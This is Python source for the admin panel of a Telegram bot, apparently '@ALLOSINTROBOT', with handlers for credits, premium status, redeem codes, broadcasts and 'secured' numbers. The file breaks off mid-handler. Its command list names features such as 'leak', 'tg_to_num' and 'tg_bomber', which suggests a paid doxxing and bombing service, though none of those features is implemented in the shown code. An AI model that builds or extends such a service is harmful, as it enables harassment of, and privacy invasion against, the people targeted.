# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   ADMIN COMMAND - /admin
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dp.message(Command("admin"))
async def cmd_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    
    if msg.chat.type != "private":
        await msg.answer(bq("❌ Admin panel only in private chat!"), parse_mode=PM)
        return
    
    await state.clear()
    txt = bq(
        f"🛠 <b>ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ</b>\n"
        f"──────────────────\n"
        f"🔥 ᴜsᴇʀs: {total_users()}\n"
        f"🔧 ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ: {'ON 🔴' if db_get('maintenance','0')=='1' else 'OFF 🟢'}\n"
        f"📢 ғᴏʀᴄᴇ ᴄʜᴀɴɴᴇʟs: {db_get('force_channels','None') or 'None'}\n"
        f"──────────────────\n"
        f"👇 Usᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ᴍᴀɴᴀɢᴇ."
    )
    await msg.answer(txt, reply_markup=admin_reply_kb(), parse_mode=PM)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   ADMIN REPLY KEYBOARD HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dp.message(F.text == BTN_TOTAL_USERS)
async def rk_total_users(msg: Message):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(bq(f"🔥 Tᴏᴛᴀʟ ᴜsᴇʀs: {total_users()}"), parse_mode=PM)

@dp.message(F.text == BTN_MAINTENANCE)
async def rk_maintenance(msg: Message):
    if not is_admin(msg.from_user.id):
        return
    current = db_get("maintenance", "0")
    new_val = "0" if current == "1" else "1"
    db_set("maintenance", new_val)
    status = "ON 🔴" if new_val == "1" else "OFF 🟢"
    await msg.answer(bq(f"🔧 Mᴀɪɴᴛᴇɴᴀɴᴄᴇ: {status}"), parse_mode=PM)

@dp.message(F.text == BTN_ADD_CHANNEL)
async def rk_add_channel(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    current = db_get("force_channels", "None")
    await msg.answer(
        bq(
            f"📢 ᴀᴅᴅ ғᴏʀᴄᴇ ᴄʜᴀɴɴᴇʟ\n\n"
            f"ᴄᴜʀʀᴇɴᴛ: {current}\n\n"
            f"sᴇɴᴅ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ(s) ᴄᴏᴍᴍᴀ sᴇᴘᴀʀᴀᴛᴇᴅ.\n"
            f"Exᴀᴍᴘʟᴇ: @ᴄʜ1,@ᴄʜ2\n"
            f"sᴇɴᴅ 'ᴄʟᴇᴀʀ' ᴛᴏ ʀᴇᴍᴏᴠᴇ ᴀʟʟ."
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.add_channel)

@dp.message(AdminState.add_channel, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_add_channel_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    if not msg.text:
        return
    text = msg.text.strip()
    if text.lower() == "clear":
        db_set("force_channels", "")
        await msg.answer(bq("✅ ғᴏʀᴄᴇ ᴄʜᴀɴɴᴇʟs ᴄʟᴇᴀʀᴇᴅ!"), parse_mode=PM)
    else:
        db_set("force_channels", text)
        await msg.answer(bq(f"✅ ғᴏʀᴄᴇ ᴄʜᴀɴɴᴇʟs sᴇᴛ:\n{text}"), parse_mode=PM)
    await state.clear()

@dp.message(F.text == BTN_REMOVE_CHANNEL)
async def rk_remove_channel(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    current = db_get("force_channels", "")
    if not current:
        await msg.answer(bq("ℹ️ ɴᴏ ғᴏʀᴄᴇ ᴄʜᴀɴɴᴇʟs sᴇᴛ!"), parse_mode=PM)
        return
    
    await msg.answer(
        bq(
            f"🗑️ ʀᴇᴍᴏᴠᴇ ғʀᴏᴍ ғᴏʀᴄᴇ\n\n"
            f"ᴄᴜʀʀᴇɴᴛ: {current}\n\n"
            f"sᴇɴᴅ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ ᴛᴏ ʀᴇᴍᴏᴠᴇ (ᴇxᴀᴄᴛ ᴍᴀᴛᴄʜ):"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.remove_channel)

@dp.message(AdminState.remove_channel, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_remove_channel_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    if not msg.text:
        return
    to_remove = msg.text.strip()
    current = db_get("force_channels", "")
    channels = [c.strip() for c in current.split(",") if c.strip()]
    if to_remove in channels:
        channels.remove(to_remove)
        db_set("force_channels", ",".join(channels))
        await msg.answer(bq(f"✅ ʀᴇᴍᴏᴠᴇᴅ: {to_remove}"), parse_mode=PM)
    else:
        await msg.answer(bq(f"❌ '{to_remove}' ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
    await state.clear()

@dp.message(F.text == BTN_SET_MEDIA)
async def rk_set_media(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "🖼 ᴇᴀsʏᴏᴏʀᴅ ᴍᴇᴅɪᴀ\n\n"
            "sᴇɴᴅ ᴄᴏᴍᴍᴀɴᴅ ɴᴀᴍᴇ:\n"
            "start / get_info / profile / refer / daily_spin / blast / leak / tg_to_num / tg_bomber / custom_bomber\n\n"
            "ᴛʏᴘᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ɴᴀᴍᴇ ɴᴏᴡ:"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.set_media_cmd)

@dp.message(AdminState.set_media_cmd, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_set_media_cmd(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    if not msg.text:
        return
    cmd = msg.text.strip().lower()
    valid = ["start","get_info","profile","refer","daily_spin","blast","leak","tg_to_num","tg_bomber","custom_bomber"]
    if cmd not in valid:
        await msg.answer(bq(f"❌ ɪɴᴠᴀʟɪᴅ. ᴄʜᴏᴏsᴇ ғʀᴏᴍ: {', '.join(valid)}"), parse_mode=PM)
        return
    await state.update_data(media_cmd=cmd)
    await msg.answer(bq(f"✅ ᴄᴏᴍᴍᴀɴᴅ: {cmd}\nɴᴏᴡ sᴇɴᴅ ᴛʜᴇ ᴘʜᴏᴛᴏ ᴏʀ ᴠɪᴅᴇᴏ:"), parse_mode=PM)
    await state.set_state(AdminState.set_media_file)

@dp.message(AdminState.set_media_file)
async def handle_set_media_file(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    data = await state.get_data()
    cmd = data.get("media_cmd")
    file_id = None
    media_type = None
    if msg.photo:
        file_id = msg.photo[-1].file_id
        media_type = "photo"
    elif msg.video:
        file_id = msg.video.file_id
        media_type = "video"
    if not file_id:
        await msg.answer(bq("❌ sᴇɴᴅ ᴀ ᴘʜᴏᴛᴏ ᴏʀ ᴠɪᴅᴇᴏ!"), parse_mode=PM)
        return
    media_raw = db_get("dashboard_media", "{}")
    try:
        media = json.loads(media_raw)
    except:
        media = {}
    media[cmd] = {"file_id": file_id, "type": media_type}
    db_set("dashboard_media", json.dumps(media))
    await msg.answer(bq(f"✅ {media_type} sᴇᴛ ғᴏʀ: {cmd}"), parse_mode=PM)
    await state.clear()

@dp.message(F.text == BTN_REMOVE_MEDIA)
async def rk_remove_media(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "🗑️ ʀᴇᴍᴏᴠᴇ ᴇᴀsʏᴏᴏʀᴅ ᴍᴇᴅɪᴀ\n\n"
            "sᴇɴᴅ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ɴᴀᴍᴇ ᴛᴏ ʀᴇᴍᴏᴠᴇ:\n"
            "start / get_info / profile / refer / daily_spin / blast / leak / tg_to_num / tg_bomber / custom_bomber"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.remove_media_cmd)

@dp.message(AdminState.remove_media_cmd, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_remove_media_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    if not msg.text:
        return
    cmd = (msg.text or "").strip().lower()
    valid = ["start", "get_info", "profile", "refer", "daily_spin", "blast", "leak", "tg_to_num", "tg_bomber", "custom_bomber"]
    if cmd not in valid:
        await msg.answer(bq(f"❌ ɪɴᴠᴀʟɪᴅ. ᴄʜᴏᴏsᴇ ғʀᴏᴍ: {', '.join(valid)}"), parse_mode=PM)
        return
    media_raw = db_get("dashboard_media", "{}")
    try:
        media = json.loads(media_raw)
    except Exception:
        media = {}
    if cmd not in media:
        await msg.answer(bq(f"ℹ️ ɴᴏ ᴍᴇᴅɪᴀ sᴇᴛ ғᴏʀ: {cmd}"), parse_mode=PM)
    else:
        media.pop(cmd, None)
        db_set("dashboard_media", json.dumps(media))
        await msg.answer(bq(f"✅ ᴍᴇᴅɪᴀ ʀᴇᴍᴏᴠᴇᴅ ғᴏʀ: {cmd}"), parse_mode=PM)
    await state.clear()

@dp.message(F.text == BTN_ADD_CREDITS_ADMIN)
async def rk_add_credits_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq("💰 ᴀᴅᴅ ᴄʀᴇᴅɪᴛs\n\nsᴇɴᴅ: ᴜsᴇʀ_ɪᴅ ᴀᴍᴏᴜɴᴛ\nExᴀᴍᴘʟᴇ: 8137776838 60"),
        parse_mode=PM
    )
    await state.set_state(AdminState.give_credits)

@dp.message(AdminState.give_credits, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_give_credits_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    if not msg.text:
        return
    parts = msg.text.strip().split()
    if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ! ᴜsᴀɢᴇ: ᴜsᴇʀ_ɪᴅ ᴀᴍᴏᴜɴᴛ"), parse_mode=PM)
        return
    
    target = int(parts[0])
    amount = int(parts[1])
    
    if is_owner(target):
        await msg.answer(bq("❌ ᴄᴀɴ'ᴛ ɢɪᴠᴇ ᴛᴏ ᴏᴡɴᴇʀ!"), parse_mode=PM)
        await state.clear()
        return
    
    u = get_user(target)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        await state.clear()
        return    
    before = u['credits']
    add_credits(target, amount)
    u2 = get_user(target)
    after = u2['credits']
    
    await msg.answer(
        bq(
            f"✅ ᴄʀᴇᴅɪᴛs ᴀᴅᴅᴇᴅ!\n"
            f"──────────────────\n"
            f"👤 ᴜsᴇʀ: {u['full_name']} ({target})\n"
            f"➕ ᴀᴍᴏᴜɴᴛ: +{amount}\n"
            f"📊 ʙᴇғᴏʀᴇ: {before}\n"
            f"📊 ᴀғᴛᴇʀ: {after}"
        ),
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_REMOVE_CREDITS_ADMIN)
async def rk_remove_credits_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq("💸 ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛs\n\nsᴇɴᴅ: ᴜsᴇʀ_ɪᴅ ᴀᴍᴏᴜɴᴛ\nExᴀᴍᴘʟᴇ: 8137776838 60"),
        parse_mode=PM
    )
    await state.set_state(AdminState.remove_credits)

@dp.message(AdminState.remove_credits, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_remove_credits_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    if not msg.text:
        return
    parts = msg.text.strip().split()
    if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ! ᴜsᴀɢᴇ: ᴜsᴇʀ_ɪᴅ ᴀᴍᴏᴜɴᴛ"), parse_mode=PM)
        return
    
    target = int(parts[0])
    amount = int(parts[1])
    
    if is_owner(target):
        await msg.answer(bq("❌ ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ғʀᴏᴍ ᴏᴡɴᴇʀ!"), parse_mode=PM)
        await state.clear()
        return
    
    u = get_user(target)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        await state.clear()
        return
    
    if is_premium(target):
        await msg.answer(bq("❌ ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ!"), parse_mode=PM)
        await state.clear()
        return
    
    before = u['credits']
    if before < amount:
        await msg.answer(bq(f"❌ ᴜsᴇʀ ᴏɴʟʏ ʜᴀs {before} ᴄʀᴇᴅɪᴛs!"), parse_mode=PM)
        await state.clear()
        return
    
    deduct_credits(target, amount)
    u2 = get_user(target)
    after = u2['credits']
    
    await msg.answer(
        bq(
            f"✅ ᴄʀᴇᴅɪᴛs ʀᴇᴍᴏᴠᴇᴅ!\n"
            f"──────────────────\n"
            f"👤 ᴜsᴇʀ: {u['full_name']} ({target})\n"
            f"➖ ᴀᴍᴏᴜɴᴛ: -{amount}\n"
            f"📊 ʙᴇғᴏʀᴇ: {before}\n"
            f"📊 ᴀғᴛᴇʀ: {after}"
        ),
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_ADD_PREMIUM)
async def rk_add_premium_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq("⭐ ᴀᴅᴅ ᴘʀᴇᴍɪᴜᴍ\n\nsᴇɴᴅ: ᴜsᴇʀ_ɪᴅ ᴅᴀʏs\nExᴀᴍᴘʟᴇ: 8137776838 30"),
        parse_mode=PM
    )
    await state.set_state(AdminState.give_premium)

@dp.message(AdminState.give_premium, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_give_premium_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    if not msg.text:
        return
    parts = msg.text.strip().split()
    if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ! ᴜsᴀɢᴇ: ᴜsᴇʀ_ɪᴅ ᴅᴀʏs"), parse_mode=PM)
        return
    
    target = int(parts[0])
    days = int(parts[1])
    
    if is_owner(target):
        await msg.answer(bq("❌ ᴏᴡɴᴇʀ ɪs ᴀʟʀᴇᴀᴅʏ ᴜɴʟɪᴍɪᴛᴇᴅ!"), parse_mode=PM)
        await state.clear()
        return
    
    u = get_user(target)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        await state.clear()
        return
    
    set_premium(target, days)
    until = datetime.fromtimestamp(u['premium_until'] + (days * 86400)).strftime("%d %b %Y")
    
    await msg.answer(
        bq(
            f"✅ ᴘʀᴇᴍɪᴜᴍ ᴀᴅᴅᴇᴅ!\n"
            f"──────────────────\n"
            f"👤 ᴜsᴇʀ: {u['full_name']} ({target})\n"
            f"📅 ᴅᴀʏs: {days}\n"
            f"📆 ᴠᴀʟɪᴅ ᴜɴᴛɪʟ: {until}"
        ),
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_REMOVE_PREMIUM)
async def rk_remove_premium_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq("🚫 ʀᴇᴍᴏᴠᴇ ᴘʀᴇᴍɪᴜᴍ\n\nsᴇɴᴅ ᴛʜᴇ ᴜsᴇʀ_ɪᴅ:"),
        parse_mode=PM
    )
    await state.set_state(AdminState.remove_premium_state)

@dp.message(AdminState.remove_premium_state, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_remove_premium_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    if not msg.text:
        return
    target = msg.text.strip()
    if not target.isdigit():
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ_ɪᴅ!"), parse_mode=PM)
        return
    
    target = int(target)
    
    if is_owner(target):
        await msg.answer(bq("❌ ᴄᴀɴ'ᴛ ʀᴇᴍᴏᴠᴇ ғʀᴏᴍ ᴏᴡɴᴇʀ!"), parse_mode=PM)
        await state.clear()
        return
    
    u = get_user(target)
    if not u:
        await msg.answer(bq("❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ!"), parse_mode=PM)
        await state.clear()
        return
    
    if not is_premium(target):
        await msg.answer(bq("❌ ᴜsᴇʀ ɪs ɴᴏᴛ ᴘʀᴇᴍɪᴜᴍ!"), parse_mode=PM)
        await state.clear()
        return
    
    remove_premium(target)
    await msg.answer(
        bq(
            f"✅ ᴘʀᴇᴍɪᴜᴍ ʀᴇᴍᴏᴠᴇᴅ!\n"
            f"──────────────────\n"
            f"👤 ᴜsᴇʀ: {u['full_name']} ({target})\n"
            f"📌 ɴᴏᴡ ғʀᴇᴇ ᴜsᴇʀ"
        ),
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_ADD_ADMIN)
async def rk_add_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq("➕ ᴀᴅᴅ ᴀᴅᴍɪɴ\n\nsᴇɴᴅ ᴛʜᴇ ᴜsᴇʀ_ɪᴅ:"),
        parse_mode=PM
    )
    await state.set_state(AdminState.add_admin)

@dp.message(AdminState.add_admin, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_add_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    if not msg.text:
        return
    text = msg.text.strip()
    if not text.isdigit():
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ_ɪᴅ!"), parse_mode=PM)
        return
    new_uid = int(text)
    extra = db_get("extra_admins", "")
    ids = [x for x in extra.split(",") if x.strip()]
    if str(new_uid) not in ids:
        ids.append(str(new_uid))
    db_set("extra_admins", ",".join(ids))
    await msg.answer(bq(f"✅ ᴀᴅᴍɪɴ ᴀᴅᴅᴇᴅ: {new_uid}"), parse_mode=PM)
    await state.clear()

@dp.message(F.text == BTN_CREATE_REDEEM)
async def rk_create_redeem(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "🎫 ᴄʀᴇᴀᴛᴇ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ\n\n"
            "ʜᴏᴡ ᴍᴀɴʏ ᴄʀᴇᴅɪᴛs sʜᴏᴜʟᴅ ᴛʜᴇ ᴄᴏᴅᴇ ɢɪᴠᴇ?\n"
            "ᴇxᴀᴍᴘʟᴇ: 10"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.create_redeem_credits)

@dp.message(AdminState.create_redeem_credits, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_create_redeem_credits_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    if not msg.text.isdigit():
        await msg.answer(
            bq("❌ ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!"),
            parse_mode=PM
        )
        return
    
    credits = int(msg.text)
    await state.update_data(redeem_credits=credits)
    
    await msg.answer(
        bq(
            f"✅ ᴄʀᴇᴅɪᴛs sᴇᴛ ᴛᴏ: {credits}\n\n"
            "ʜᴏᴡ ᴍᴀɴʏ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴅᴇ?\n"
            "ᴇxᴀᴍᴘʟᴇ: 1"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.create_redeem_limit)

@dp.message(AdminState.create_redeem_limit, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_create_redeem_limit_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    if not msg.text.isdigit():
        await msg.answer(
            bq("❌ ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!"),
            parse_mode=PM
        )
        return
    
    max_uses = int(msg.text)
    data = await state.get_data()
    credits = data.get("redeem_credits", 10)
    
    code = create_redeem_code(credits, max_uses, msg.from_user.id)
    
    orange_line = f"<tg-emoji emoji-id=\"{EMOJI_ORANGE_LINE}\">➿</tg-emoji>" * 7
    
    await msg.answer(
        f"<blockquote>"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_CHECK}\">✅</tg-emoji> <b>ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ ᴄʀᴇᴀᴛᴇᴅ!</b>\n"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_CREDITS}\">💰</tg-emoji> ᴄʀᴇᴅɪᴛs: {credits}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_USER}\">🔥</tg-emoji> ᴍᴀx ᴜsᴇs: {max_uses}\n"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_REDEEM}\">🎫</tg-emoji> <b>ᴄᴏᴅᴇ: <code>{code}</code></b>\n"
        f"{orange_line}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_GIVE_BOT}\">🤖</tg-emoji> ᴘᴏᴡᴇʀᴇᴅ ʙʏ: @ALLOSINTROBOT  <tg-emoji emoji-id=\"{EMOJI_GIVE_STAR}\">🌟</tg-emoji>\n"
        f"</blockquote>",
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_VIEW_REDEEM)
async def rk_view_redeem(msg: Message):
    if not is_admin(msg.from_user.id):
        return
    
    codes = get_all_redeem_codes()
    if not codes:
        await msg.answer(bq("📋 ɴᴏ ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs ᴄʀᴇᴀᴛᴇᴅ ʏᴇᴛ!"), parse_mode=PM)
        return
    
    msg_text = "📋 <b>ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs</b>\n──────────────────\n"
    for code_data in codes:
        code, credits, max_uses, used_count, created_by, created_at = code_data
        msg_text += f"\n🎫 <code>{code}</code>\n"
        msg_text += f"├💰 {credits} ᴄʀᴇᴅɪᴛs\n"
        msg_text += f"└🔥 {used_count}/{max_uses} ᴜsᴇᴅ\n"
    
    await msg.answer(msg_text, parse_mode=PM)

@dp.message(F.text == BTN_BROADCAST)
async def rk_broadcast(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "📢 ʙʀᴏᴀᴅᴄᴀsᴛ ᴍsɢ\n\n"
            "sᴇɴᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ᴀʟʟ ᴜsᴇʀs:"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.broadcast_msg)

@dp.message(AdminState.broadcast_msg, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_broadcast_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    broadcast_text = msg.text
    users = get_all_users()
    sent = 0
    failed = 0
    
    for user in users:
        try:
            await bot.send_message(user["user_id"], broadcast_text, parse_mode=PM)
            sent += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    
    await msg.answer(
        bq(
            f"✅ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!\n"
            f"──────────────────\n"
            f"📨 sᴇɴᴛ: {sent}\n"
            f"❌ ғᴀɪʟᴇᴅ: {failed}\n"
            f"🔥 ᴛᴏᴛᴀʟ: {sent + failed}"
        ),
        parse_mode=PM
    )
    await state.clear()

def get_all_users():
    cur.execute("SELECT user_id FROM users")
    return [{"user_id": row[0]} for row in cur.fetchall()]

@dp.message(F.text == BTN_SECURE_NUMBER)
async def rk_secure_number(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "🔒 sᴇᴄᴜʀᴇ ɴᴜᴍʙᴇʀ\n\n"
            "ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇᴄᴜʀᴇ:\n"
            "ᴇxᴀᴍᴘʟᴇ: 9165283914"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.secure_number_state)

@dp.message(AdminState.secure_number_state, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_secure_number_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    number = msg.text.strip()
    if not number.isdigit():
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ! ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴏɴʟʏ ᴅɪɢɪᴛs."), parse_mode=PM)
        return
    
    secure_number(number, msg.from_user.id)
    await msg.answer(
        bq(f"✅ ɴᴜᴍʙᴇʀ {number} sᴇᴄᴜʀᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"),
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_UNSECURE_NUMBER)
async def rk_unsecure_number(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "🔓 ᴜɴsᴇᴄᴜʀᴇ ɴᴜᴍʙᴇʀ\n\n"
            "ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴜɴsᴇᴄᴜʀᴇ:\n"
            "ᴇxᴀᴍᴘʟᴇ: 9165283914"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.unsecure_number_state)

@dp.message(AdminState.unsecure_number_state, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_unsecure_number_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    number = msg.text.strip()
    if not number.isdigit():
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ! ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴏɴʟʏ ᴅɪɢɪᴛs."), parse_mode=PM)
        return
    
    if not is_number_secured(number):
        await msg.answer(bq(f"❌ ɴᴜᴍʙᴇʀ {number} ɪs ɴᴏᴛ sᴇᴄᴜʀᴇᴅ!"), parse_mode=PM)
        await state.clear()
        return
    
    unsecure_number(number)
    await msg.answer(
        bq(f"✅ ɴᴜᴍʙᴇʀ {number} ᴜɴsᴇᴄᴜʀᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"),
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_SECURE_TG)
async def rk_secure_tg(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "🔒 sᴇᴄᴜʀᴇ ᴛɢ\n\n"
            "ᴇɴᴛᴇʀ ᴛʜᴇ ᴜsᴇʀ ɪᴅ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇᴄᴜʀᴇ:\n"
            "ᴇxᴀᴍᴘʟᴇ: 8137776838"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.secure_user_state)

@dp.message(AdminState.secure_user_state, ~F.text.in_(ALL_REPLY_BUTTONS))
async def handle_secure_user_admin(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        await state.clear()
        return
    
    if not msg.text:
        return
    
    user_id = msg.text.strip()
    if not user_id.isdigit():
        await msg.answer(bq("❌ ɪɴᴠᴀʟɪᴅ ᴜsᴇʀ ɪᴅ! ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴏɴʟʏ ᴅɪɢɪᴛs."), parse_mode=PM)
        return
    
    secure_user(int(user_id), msg.from_user.id)
    await msg.answer(
        bq(f"✅ ᴜsᴇʀ {user_id} sᴇᴄᴜʀᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!"),
        parse_mode=PM
    )
    await state.clear()

@dp.message(F.text == BTN_UNSECURE_TG)
async def rk_unsecure_tg(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer(
        bq(
            "🔓 ᴜɴsᴇᴄᴜʀᴇ ᴛɢ\n\n"
            "ᴇɴᴛᴇʀ ᴛʜᴇ ᴜsᴇʀ ɪᴅ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴜɴsᴇᴄᴜʀᴇ:\n"
            "ᴇxᴀᴍᴘʟᴇ: 8137776838"
        ),
        parse_mode=PM
    )
    await state.set_state(AdminState.unsecure_user_state)

@dp.message(AdminState.unsecure_user_state, ~F.text.in_(ALL_REPLY_BUTTONS))
